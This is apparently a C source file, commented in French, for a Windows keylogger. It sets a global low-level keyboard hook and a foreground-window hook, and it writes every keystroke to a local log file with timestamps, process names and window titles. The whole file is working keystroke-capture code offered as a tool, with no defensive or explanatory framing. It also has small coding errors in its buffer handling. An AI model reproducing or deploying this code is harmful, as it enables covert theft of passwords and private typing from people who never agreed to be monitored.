#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

// Variables globales
HHOOK           g_keyboard_hook;
HWINEVENTHOOK   g_window_hook;
FILE*           g_logfile;
HWND            g_last_window = NULL;           // Dernière fenêtre enregistrée
HWND            g_foreground_window = NULL;     // Fenêtre en premier plan
char            g_process_name[MAX_PATH] = "";  // Processus en premier plan
char            g_window_title[256];            // Titre de la fenêtre en premier plan

// Prototypes de fonctions
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
static void CALLBACK handle_fg_window_change(HWINEVENTHOOK, DWORD, HWND, LONG, LONG, DWORD, DWORD);
static void write_to_log(const char* str);
static const char* get_special_key_name(DWORD vkCode);
static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);

// Fonction principale
int main(int argc, char *argv[])
{
    if (argc == 0 || argv[0] == NULL)
        return 1;

    char log_path[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, log_path, MAX_PATH);
    char* last_backslash = strrchr(log_path, '\\');
    if (last_backslash) {
        *last_backslash = '\0';
    }
    // Construire le chemin complet vers keystrokes.log
    snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);

    // Ouvrir le fichier log
    g_logfile = fopen(log_path, "a");
    if (g_logfile == NULL) {
        MessageBox(NULL, "Erreur d'ouverture du fichier log.", "Erreur", MB_ICONERROR);
        return 1;
    }

    // Installer le hook
    g_window_hook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Range of events (0x3 to 0x3).
        NULL,                                               // Handle to DLL.
        handle_fg_window_change,                            // The callback.
        0, 0,                                               // Process and thread IDs of interest (0 = all)
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags.
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (g_keyboard_hook == NULL || g_window_hook == NULL) {
        fclose(g_logfile);
        return 1;
    }

	// Initialiser la fenêtre et le processus en premier plan
	handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);

    // Boucle de message
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    // Nettoyage
    UnhookWinEvent(g_window_hook);
    UnhookWindowsHookEx(g_keyboard_hook);
    fclose(g_logfile);
    return 0;
}

// Fonction pour retirer les brackets
static void remove_brackets(char* str)
{
    char* src = str;
    char* dest = str;

    while (*src) {
        if (*src != '[' && *src != ']') {
            *dest++ = *src;
        }
        src++;
    }
    *dest = '\0';
}

// Fonction de hook pour capturer les frappes
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        char key[32] = { 0 };

        // Récupérer l'état du clavier
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Vérifier l'état de Shift et de Caps Lock
        BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||
			pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||
			pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE ||
            pKeyboard->vkCode == VK_SPACE) {
			strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
		}
		else { // La touche est une touche spéciale
			strcpy(key, get_special_key_name(pKeyboard->vkCode));
        }

		if (strcmp(key, "") == 0) {
			return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
		}

        // Gérer les combinaisons de touches (e.g., Ctrl+C)
        char tmp_key[32] = { 0 };
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // Alt key
			remove_brackets(key);
            sprintf(tmp_key, "[Alt+%s]", key);
            strcpy(key, tmp_key);
        }
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
			remove_brackets(key);
            sprintf(tmp_key, "[Ctrl+%s]", key);
			strcpy(key, tmp_key);
        }

        // Écrire la touche dans le fichier log
        write_to_log(key);
    }
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

// Fonction pour écrire dans le fichier log
static void write_to_log(const char* str)
{
    if (g_foreground_window != g_last_window) {
		// La fenêtre a changé, écrire le nom du processus et le titre de la fenêtre
        g_last_window = g_foreground_window;
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s) %s\n",
            tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
            tm.tm_hour, tm.tm_min, tm.tm_sec,
            g_process_name, g_window_title);
    }
    fprintf(g_logfile, "%s", str);
    fflush(g_logfile);
}

static void CALLBACK handle_fg_window_change(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
)
{
    (void)hWinEventHook, event, idObject, idChild, idEventThread, dwmsEventTime;

    // Obtenir le style de la fenêtre
    LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);

    // Vérifier si la fenêtre est une fenêtre utilitaire ou système
	// J'ajoute cela afin d'eviter de log "Task Switching" lors de l'utilisation de ALT+TAB
    if (exStyle & WS_EX_TOOLWINDOW) {
        // C'est une fenêtre de type outil, probablement pas une fenêtre d'application principale
        return;
    }

    // Obtenir la fenêtre et le processus en premier plan
    g_foreground_window = hwnd;
    DWORD pid;
    GetWindowThreadProcessId(g_foreground_window, &pid);

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
    strcpy(g_process_name, PathFindFileName(g_process_name));
    CloseHandle(process);

    GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
}

static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn)
{
    static char key[2] = { 0 }; // Static pour retourner un pointeur valide
    HKL keyboardLayout = GetKeyboardLayout(0); // Obtient la disposition de clavier pour le thread actuel

    // Utiliser ToUnicodeEx pour gérer les locales et les dispositions de clavier
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)key, sizeof(key), 0, keyboardLayout);

    if (result == 1) {
        // Gestion des majuscules/minuscules
        if ((isShiftPressed && !isCapsLockOn) || (!isShiftPressed && isCapsLockOn)) {
            key[0] = (char)toupper(key[0]);
        }
        else if (!isShiftPressed && !isCapsLockOn) {
            key[0] = (char)tolower(key[0]);
        }
    }
    else {
        return "[Unknown Key]";
    }

    return key;
}

static const char* get_special_key_name(DWORD vkCode)
{
    switch (vkCode) {
    case VK_TAB: return "[Tab]";
    case VK_RETURN: return "[Enter]";
    case VK_BACK: return "[Backspace]";
    case VK_CAPITAL: return "";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return "[Space]";
    case VK_PRIOR: return "[Page Up]";
    case VK_NEXT: return "[Page Down]";
    case VK_END: return "[End]";
    case VK_HOME: return "[Home]";
    case VK_LEFT: return "[Left Arrow]";
    case VK_UP: return "[Up Arrow]";
    case VK_RIGHT: return "[Right Arrow]";
    case VK_DOWN: return "[Down Arrow]";
    case VK_INSERT: return "[Insert]";
    case VK_DELETE: return "[Delete]";
    case VK_LWIN: return "[Left Windows]";
    case VK_RWIN: return "[Right Windows]";
    case VK_APPS: return "[Application]";
    case VK_SLEEP: return "[Sleep]";
    case VK_NUMPAD0: return "[Numpad 0]";
    case VK_NUMPAD1: return "[Numpad 1]";
    case VK_NUMPAD2: return "[Numpad 2]";
    case VK_NUMPAD3: return "[Numpad 3]";
    case VK_NUMPAD4: return "[Numpad 4]";
    case VK_NUMPAD5: return "[Numpad 5]";
    case VK_NUMPAD6: return "[Numpad 6]";
    case VK_NUMPAD7: return "[Numpad 7]";
    case VK_NUMPAD8: return "[Numpad 8]";
    case VK_NUMPAD9: return "[Numpad 9]";
    case VK_MULTIPLY: return "[Numpad *]";
    case VK_ADD: return "[Numpad +]";
    case VK_SEPARATOR: return "[Numpad Separator]";
    case VK_SUBTRACT: return "[Numpad -]";
    case VK_DECIMAL: return "[Numpad .]";
    case VK_DIVIDE: return "[Numpad /]";
    case VK_F1: return "[F1]";
    case VK_F2: return "[F2]";
    case VK_F3: return "[F3]";
    case VK_F4: return "[F4]";
    case VK_F5: return "[F5]";
    case VK_F6: return "[F6]";
    case VK_F7: return "[F7]";
    case VK_F8: return "[F8]";
    case VK_F9: return "[F9]";
    case VK_F10: return "[F10]";
    case VK_F11: return "[F11]";
    case VK_F12: return "[F12]";
    case VK_NUMLOCK: return "[Num Lock]";
    case VK_SCROLL: return "[Scroll Lock]";
    case VK_LSHIFT: return "";
    case VK_RSHIFT: return "";
    case VK_LCONTROL: return "";
    case VK_RCONTROL: return "";
    case VK_LMENU: return "";
    case VK_RMENU: return "";
    case VK_VOLUME_MUTE: return "[Volume Mute]";
    case VK_VOLUME_DOWN: return "[Volume Down]";
    case VK_VOLUME_UP: return "[Volume Up]";
    case VK_MEDIA_NEXT_TRACK: return "[Next Track]";
    case VK_MEDIA_PREV_TRACK: return "[Previous Track]";
    case VK_MEDIA_STOP: return "[Stop Media]";
    case VK_MEDIA_PLAY_PAUSE: return "[Play/Pause Media]";
    case VK_LAUNCH_MAIL: return "[Launch Mail]";
    case VK_LAUNCH_MEDIA_SELECT: return "[Launch Media Select]";
    case VK_LAUNCH_APP1: return "[Launch App 1]";
    case VK_LAUNCH_APP2: return "[Launch App 2]";
    case VK_BROWSER_BACK: return "[Browser Back]";
    case VK_BROWSER_FORWARD: return "[Browser Forward]";
    case VK_BROWSER_REFRESH: return "[Browser Refresh]";
    case VK_BROWSER_STOP: return "[Browser Stop]";
    case VK_BROWSER_SEARCH: return "[Browser Search]";
    case VK_BROWSER_FAVORITES: return "[Browser Favorites]";
    case VK_BROWSER_HOME: return "[Browser Home]";
    case VK_OEM_1: return "[OEM 1 (;:)]";
    case VK_OEM_PLUS: return "[OEM Plus (+)]";
    case VK_OEM_COMMA: return "[OEM Comma (,)]";
    case VK_OEM_MINUS: return "[OEM Minus (-)]";
    case VK_OEM_PERIOD: return "[OEM Period (.)]";
    case VK_OEM_2: return "[OEM 2 (/?) ]";
    case VK_OEM_3: return "[OEM 3 (`~)]";
    case VK_OEM_4: return "[OEM 4 ([{)]";
    case VK_OEM_5: return "[OEM 5 (\\|)]";
    case VK_OEM_6: return "[OEM 6 (]}])]";
    case VK_OEM_7: return "[OEM 7 ('\") ]";
    case VK_OEM_8: return "[OEM 8]";
    case VK_OEM_102: return "[OEM 102 (<|>)]";
    default: return "[Unknown Key]";
    }
}
